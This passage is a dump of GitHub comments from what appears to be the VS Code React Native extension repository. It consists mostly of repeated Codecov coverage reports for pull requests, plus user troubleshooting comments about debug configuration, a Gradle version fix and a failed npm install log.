src/debugger/forkedAppWorker.ts | 86.56% <100%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #788 into master will increase coverage by 0.01%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #788      +/-\n==========================================\n+ Coverage   14.31%   14.33%   +0.01%   \n==========================================\n  Files          62       62            \n  Lines        3276     3272       -4   \n  Branches      427      427            \n==========================================\n  Hits          469      469            \n+ Misses       2807     2803       -4\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/generalMobilePlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/windows/windowsPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/exponent/exponentPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #789 into master will decrease coverage by <.01%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #789      +/-\n==========================================\n- Coverage   14.33%   14.32%   -0.01%   \n==========================================\n  Files          62       62            \n  Lines        3272     3274       +2   \n  Branches      427      427            \n==========================================\n  Hits          469      469            \n- Misses       2803     2805       +2\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/nodeDebugWrapper.ts | 2.85% <0%> (-0.06%) | :arrow_down: |\n. # Codecov Report\n\nMerging #792 into master will decrease coverage by 0.02%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff            @@\nmaster    #792      +/-\n=========================================\n- Coverage   14.32%   14.3%   -0.03%   \n=========================================\n  Files          62      62            \n  Lines        3274    3279       +5   \n  Branches      427     428       +1   \n=========================================\n  Hits          469     469            \n- Misses       2805    2810       +5\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/packager.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #798 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #798   +/-\n======================================\n  Coverage    14.3%   14.3%         \n======================================\n  Files          62      62         \n  Lines        3279    3279         \n  Branches      428     428         \n======================================\n  Hits          469     469         \n  Misses       2810    2810\n```\n. # Codecov Report\n\nMerging #799 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #799   +/-\n======================================\n  Coverage    14.3%   14.3%         \n======================================\n  Files          62      62         \n  Lines        3279    3279         \n  Branches      428     428         \n======================================\n  Hits          469     469         \n  Misses       2810    2810\n```\n. # Codecov Report\n\nMerging #800 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #800   +/-\n======================================\n  Coverage    14.3%   14.3%         \n======================================\n  Files          62      62         \n  Lines        3279    3279         \n  Branches      428     428         \n======================================\n  Hits          469     469         \n  Misses       2810    2810\n```\n. # Codecov Report\n\nMerging #802 into master will decrease coverage by 0.02%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #802      +/-\n==========================================\n- Coverage    14.3%   14.28%   -0.03%   \n==========================================\n  Files          62       62            \n  Lines        3279     3284       +5   \n  Branches      428      429       +1   \n==========================================\n  Hits          469      469            \n- Misses       2810     2815       +5\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/android/adb.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #805 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #805   +/-\n=======================================\n  Coverage   14.28%   14.28%         \n=======================================\n  Files          62       62         \n  Lines        3284     3284         \n  Branches      429      429         \n=======================================\n  Hits          469      469         \n  Misses       2815     2815\n```\n. # Codecov Report\n\nMerging #806 into master will decrease coverage by 0.08%.\nThe diff coverage is 4.76%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #806      +/-\n==========================================\n- Coverage   14.28%   14.19%   -0.09%   \n==========================================\n  Files          62       62            \n  Lines        3284     3303      +19   \n  Branches      429      431       +2   \n==========================================\n  Hits          469      469            \n- Misses       2815     2834      +19\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/rn-extension.ts | 8.59% <33.33%> (-0.14%) | :arrow_down: |\n. # Codecov Report\n\nMerging #807 into master will decrease coverage by 0.11%.\nThe diff coverage is 3.57%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #807      +/-\n==========================================\n- Coverage   14.28%   14.16%   -0.12%   \n==========================================\n  Files          62       62            \n  Lines        3284     3310      +26   \n  Branches      429      432       +3   \n==========================================\n  Hits          469      469            \n- Misses       2815     2841      +26\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/rn-extension.ts | 8.59% <33.33%> (-0.14%) | :arrow_down: |\n. # Codecov Report\n\nMerging #808 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #808   +/-\n=======================================\n  Coverage   14.16%   14.16%         \n=======================================\n  Files          62       62         \n  Lines        3310     3310         \n  Branches      432      432         \n=======================================\n  Hits          469      469         \n  Misses       2841     2841\n```\n. # Codecov Report\n\nMerging #809 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #809   +/-\n=======================================\n  Coverage   14.16%   14.16%         \n=======================================\n  Files          62       62         \n  Lines        3310     3310         \n  Branches      432      432         \n=======================================\n  Hits          469      469         \n  Misses       2841     2841\n```\n. # Codecov Report\n\nMerging #810 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #810   +/-\n=======================================\n  Coverage   14.16%   14.16%         \n=======================================\n  Files          62       62         \n  Lines        3310     3310         \n  Branches      432      432         \n=======================================\n  Hits          469      469         \n  Misses       2841     2841\n```\n. # Codecov Report\n\nMerging #813 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #813   +/-\n=======================================\n  Coverage   14.16%   14.16%         \n=======================================\n  Files          62       62         \n  Lines        3310     3310         \n  Branches      432      432         \n=======================================\n  Hits          469      469         \n  Misses       2841     2841\n```\n. # Codecov Report\n\nMerging #815 into master will decrease coverage by <.01%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #815      +/-\n==========================================\n- Coverage   14.17%   14.16%   -0.01%   \n==========================================\n  Files          62       62            \n  Lines        3309     3310       +1   \n  Branches      432      432            \n==========================================\n  Hits          469      469            \n- Misses       2840     2841       +1\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #816 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #816   +/-\n=======================================\n  Coverage   14.16%   14.16%         \n=======================================\n  Files          62       62         \n  Lines        3310     3310         \n  Branches      432      432         \n=======================================\n  Hits          469      469         \n  Misses       2841     2841\n```\n. # Codecov Report\n\nMerging #817 into master will increase coverage by <.01%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #817      +/-\n==========================================\n+ Coverage   14.16%   14.17%   +<.01%   \n==========================================\n  Files          62       62            \n  Lines        3310     3309       -1   \n  Branches      432      432            \n==========================================\n  Hits          469      469            \n+ Misses       2841     2840       -1\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #818 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #818   +/-\n=======================================\n  Coverage   14.16%   14.16%         \n=======================================\n  Files          62       62         \n  Lines        3310     3310         \n  Branches      432      432         \n=======================================\n  Hits          469      469         \n  Misses       2841     2841\n```\n. # Codecov Report\n\nMerging #819 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #819   +/-\n=======================================\n  Coverage   14.17%   14.17%         \n=======================================\n  Files          62       62         \n  Lines        3309     3309         \n  Branches      432      432         \n=======================================\n  Hits          469      469         \n  Misses       2840     2840\n```\n. # Codecov Report\n\nMerging #821 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #821   +/-\n=======================================\n  Coverage   14.17%   14.17%         \n=======================================\n  Files          62       62         \n  Lines        3309     3309         \n  Branches      432      432         \n=======================================\n  Hits          469      469         \n  Misses       2840     2840\n```\n. # Codecov Report\n\nMerging #824 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #824   +/-\n=======================================\n  Coverage   14.17%   14.17%         \n=======================================\n  Files          62       62         \n  Lines        3309     3309         \n  Branches      432      432         \n=======================================\n  Hits          469      469         \n  Misses       2840     2840\n```\n. # Codecov Report\n\nMerging #826 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #826   +/-\n=======================================\n  Coverage   14.16%   14.16%         \n=======================================\n  Files          62       62         \n  Lines        3310     3310         \n  Branches      432      432         \n=======================================\n  Hits          469      469         \n  Misses       2841     2841\n```\n. # Codecov Report\n\nMerging #828 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #828   +/-\n=======================================\n  Coverage   14.17%   14.17%         \n=======================================\n  Files          62       62         \n  Lines        3309     3309         \n  Branches      432      432         \n=======================================\n  Hits          469      469         \n  Misses       2840     2840\n```\n. # Codecov Report\n\nMerging #829 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #829   +/-\n=======================================\n  Coverage   14.17%   14.17%         \n=======================================\n  Files          62       62         \n  Lines        3309     3309         \n  Branches      432      432         \n=======================================\n  Hits          469      469         \n  Misses       2840     2840\n```\n. # Codecov Report\n\nMerging #831 into master will decrease coverage by <.01%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #831      +/-\n==========================================\n- Coverage   14.17%   14.16%   -0.01%   \n==========================================\n  Files          62       62            \n  Lines        3309     3310       +1   \n  Branches      432      432            \n==========================================\n  Hits          469      469            \n- Misses       2840     2841       +1\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/rn-extension.ts | 8.73% <\u00f8> (+0.13%) | :arrow_up: |\n| src/extension/exponent/exponentPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/qrCodeContentProvider.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #832 into master will decrease coverage by 0.01%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff             @@\nmaster     #832      +/-\n==========================================\n- Coverage   14.16%   14.15%   -0.02%   \n==========================================\n  Files          62       62            \n  Lines        3310     3314       +4   \n  Branches      432      432            \n==========================================\n  Hits          469      469            \n- Misses       2841     2845       +4\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/exponent/exponentPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/exponent/exponentHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #836 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #836   +/-\n=======================================\n  Coverage   14.16%   14.16%         \n=======================================\n  Files          62       62         \n  Lines        3310     3310         \n  Branches      432      432         \n=======================================\n  Hits          469      469         \n  Misses       2841     2841\n```\n. # Codecov Report\n\nMerging #838 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@           Coverage Diff           @@\nmaster     #838   +/-\n=======================================\n  Coverage   14.16%   14.16%         \n=======================================\n  Files          62       62         \n  Lines        3310     3310         \n  Branches      432      432         \n=======================================\n  Hits          469      469         \n  Misses       2841     2841\n```\n. # Codecov Report\n\nMerging #873 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #873   +/-\n======================================\n  Coverage    1.29%   1.29%         \n======================================\n  Files          62      62         \n  Lines        3408    3408         \n  Branches      435     435         \n======================================\n  Hits           44      44         \n  Misses       3364    3364\n```\n. # Codecov Report\n\nMerging #874 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #874   +/-\n======================================\n  Coverage    1.29%   1.29%         \n======================================\n  Files          62      62         \n  Lines        3408    3408         \n  Branches      435     435         \n======================================\n  Hits           44      44         \n  Misses       3364    3364\n```\n. # Codecov Report\n\nMerging #876 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #876   +/-\n======================================\n  Coverage    1.29%   1.29%         \n======================================\n  Files          62      62         \n  Lines        3408    3408         \n  Branches      435     435         \n======================================\n  Hits           44      44         \n  Misses       3364    3364\n```\n. # Codecov Report\n\nMerging #877 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #877   +/-\n======================================\n  Coverage    1.29%   1.29%         \n======================================\n  Files          62      62         \n  Lines        3404    3404         \n  Branches      434     434         \n======================================\n  Hits           44      44         \n  Misses       3360    3360\n```\n. # Codecov Report\n\nMerging #880 into master will increase coverage by <.01%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff            @@\nmaster    #880      +/-\n=========================================\n+ Coverage    1.29%   1.29%   +<.01%   \n=========================================\n  Files          62      62            \n  Lines        3404    3403       -1   \n  Branches      434     434            \n=========================================\n  Hits           44      44            \n+ Misses       3360    3359       -1\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/scriptImporter.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #882 into master will decrease coverage by <.01%.\nThe diff coverage is 0%.\n\n```diff\n@@            Coverage Diff            @@\nmaster    #882      +/-\n=========================================\n- Coverage    1.29%   1.29%   -0.01%   \n=========================================\n  Files          62      62            \n  Lines        3403    3408       +5   \n  Branches      434     435       +1   \n=========================================\n  Hits           44      44            \n- Misses       3359    3364       +5\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/exponent/exponentHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #885 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #885   +/-\n======================================\n  Coverage    1.29%   1.29%         \n======================================\n  Files          62      62         \n  Lines        3408    3408         \n  Branches      435     435         \n======================================\n  Hits           44      44         \n  Misses       3364    3364\n```\n. # Codecov Report\n\nMerging #887 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #887   +/-\n======================================\n  Coverage    1.29%   1.29%         \n======================================\n  Files          62      62         \n  Lines        3408    3408         \n  Branches      435     435         \n======================================\n  Hits           44      44         \n  Misses       3364    3364\n```\n. # Codecov Report\n\nMerging #888 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #888   +/-\n======================================\n  Coverage    1.29%   1.29%         \n======================================\n  Files          62      62         \n  Lines        3408    3408         \n  Branches      435     435         \n======================================\n  Hits           44      44         \n  Misses       3364    3364\n```\n. # Codecov Report\n\nMerging #890 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #890   +/-\n======================================\n  Coverage    1.29%   1.29%         \n======================================\n  Files          62      62         \n  Lines        3408    3408         \n  Branches      435     435         \n======================================\n  Hits           44      44         \n  Misses       3364    3364\n```\n. # Codecov Report\n\nMerging #895 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #895   +/-\n======================================\n  Coverage    1.29%   1.29%         \n======================================\n  Files          62      62         \n  Lines        3408    3408         \n  Branches      435     435         \n======================================\n  Hits           44      44         \n  Misses       3364    3364\n```\n. # Codecov Report\n\n:exclamation: No coverage uploaded for pull request base (feature/automate-prerelease-tests@0be13c9). Click here to learn what that means.\nThe diff coverage is n/a.\n\n```diff\n@@                         Coverage Diff                         @@\nfeature/automate-prerelease-tests    #902   +/-\n===================================================================\n  Coverage                                     ?   1.29%         \n===================================================================\n  Files                                        ?      62         \n  Lines                                        ?    3408         \n  Branches                                     ?     435         \n===================================================================\n  Hits                                         ?      44         \n  Misses                                       ?    3364         \n  Partials                                     ?       0\n```\n. # Codecov Report\n\nMerging #911 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #911   +/-\n======================================\n  Coverage    1.29%   1.29%         \n======================================\n  Files          62      62         \n  Lines        3408    3408         \n  Branches      435     435         \n======================================\n  Hits           44      44         \n  Misses       3364    3364\n```\n. # Codecov Report\n\nMerging #912 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #912   +/-\n======================================\n  Coverage    1.29%   1.29%         \n======================================\n  Files          62      62         \n  Lines        3408    3408         \n  Branches      435     435         \n======================================\n  Hits           44      44         \n  Misses       3364    3364\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/error/errorStrings.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n. # Codecov Report\n\nMerging #917 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #917   +/-\n======================================\n  Coverage    1.29%   1.29%         \n======================================\n  Files          62      62         \n  Lines        3408    3408         \n  Branches      435     435         \n======================================\n  Hits           44      44         \n  Misses       3364    3364\n```\n. # Codecov Report\n\nMerging #919 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@          Coverage Diff           @@\nmaster    #919   +/-\n======================================\n  Coverage    1.29%   1.29%         \n======================================\n  Files          62      62         \n  Lines        3408    3408         \n  Branches      435     435         \n======================================\n  Hits           44      44         \n  Misses       3364    3364\n```\n. ",
    "irtemed88": "@jrmgx You may have already figured out the solution to your problem, but if not, here's what I did to get this working:\nInitially I didn't have the Debug options either, but if you open the debug dropdown there should be an \"add configuration\" option.\n\nClicking that should open launch.json with a popover that gives you the option to add the iOS debug config to your launch.json file. \n\nSelecting the Debug iOS option should add an entry to launch.json and then you can select the Debug option from the initial dropdown (like I have pictured above).\n. ",
    "jrmgx": "Thank you all for your help. ",
    "Kaybarax": "Mine is enabled but genymotion just cant pick it up.. Hey @VickyKoblinski @ruslan-bikkinin, thanks, but I was able to resolve it by adding this line:\ncompile (\"com.facebook.react:react-native:\") { force = true }\nto android/app/build.gradle\nand commenting out the line:\ncompile 'com.facebook.react:react-native:+'\nThis forces the Native Code version and your RN from node modules to match up.\n. ",
    "D1no": "Any info/progress on this? I mean, it was proposed on react conf (?). @iTOYS thanks Artem. I'll take a look when I have some time. In the mean time we decided to simply write less bugs. ",
    "chenzhiyuan0402": "same issue with me.. I also have the same issue, and I found that RN debug menu can't display when I press Cmd+D on IOS simulator.\nBelow is chrome developer tool console that start from vscode.\nworkbench.main.js:28Overwriting extension <<.jsx>> to now point to mime <>\n(anonymous) @ workbench.main.js:28\nhttps://marketplace.visualstudio.com/_apis/public/gallery/extensionquery Failed to load resource: net::ERR_TUNNEL_CONNECTION_FAILED\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] rejected promise not handled within 1 second\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] rejected promise not handled within 1 second\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] rejected promise not handled within 1 second\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 Error while executing command 'npm install xdl@36.1.0 --verbose': Error: Error while executing command 'npm install xdl@36.1.0 --verbose'\n    at Function.getInternalError (/Users/chenzhiyuan/.vscode/extensions/vsmobile.vscode-react-native-0.3.2/out/common/error/errorHelper.js:11:16)\n    at ChildProcess.spawnedProcess.once (/Users/chenzhiyuan/.vscode/extensions/vsmobile.vscode-react-native-0.3.2/out/common/node/childProcess.js:44:58)\n    at Object.onceWrapper (events.js:290:19)\n    at emitTwo (events.js:106:13)\n    at ChildProcess.emit (events.js:191:7)\n    at Process.ChildProcess._handle.onexit (internal/child_process.js:215:12)\ne.onUnexpectedError @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 Error while executing command 'npm install xdl@36.1.0 --verbose': Error while executing command 'npm install xdl@36.1.0 --verbose': Error: Error while executing command 'npm install xdl@36.1.0 --verbose': Error while executing command 'npm install xdl@36.1.0 --verbose'\n    at Function.getNestedError (/Users/chenzhiyuan/.vscode/extensions/vsmobile.vscode-react-native-0.3.2/out/common/error/errorHelper.js:15:16)\n    at CommandExecutor.generateRejectionForCommand (/Users/chenzhiyuan/.vscode/extensions/vsmobile.vscode-react-native-0.3.2/out/common/commandExecutor.js:164:51)\n    at result.outcome.result.outcome.then.reason (/Users/chenzhiyuan/.vscode/extensions/vsmobile.vscode-react-native-0.3.2/out/common/commandExecutor.js:145:25)\n    at _rejected (/Users/chenzhiyuan/.vscode/extensions/vsmobile.vscode-react-native-0.3.2/node_modules/q/q.js:844:24)\n    at /Users/chenzhiyuan/.vscode/extensions/vsmobile.vscode-react-native-0.3.2/node_modules/q/q.js:870:30\n    at Promise.when (/Users/chenzhiyuan/.vscode/extensions/vsmobile.vscode-react-native-0.3.2/node_modules/q/q.js:1122:31)\n    at Promise.promise.promiseDispatch (/Users/chenzhiyuan/.vscode/extensions/vsmobile.vscode-react-native-0.3.2/node_modules/q/q.js:788:41)\n    at /Users/chenzhiyuan/.vscode/extensions/vsmobile.vscode-react-native-0.3.2/node_modules/q/q.js:604:44\n    at runSingle (/Users/chenzhiyuan/.vscode/extensions/vsmobile.vscode-react-native-0.3.2/node_modules/q/q.js:137:13)\n    at flush (/Users/chenzhiyuan/.vscode/extensions/vsmobile.vscode-react-native-0.3.2/node_modules/q/q.js:125:13)\ne.onUnexpectedError @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] (node:30100) DeprecationWarning: os.tmpDir() is deprecated. Use os.tmpdir() instead.\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29 [Extension Host] ApplicationInsights:Sender Array[1]\nd.logExtensionHostMessage @ //Applications/Visual Studio Code 2.app/Contents/Resources/app/out/vs/workbench/electron-browser/workbench.main.js:29\n//Applications/Visual 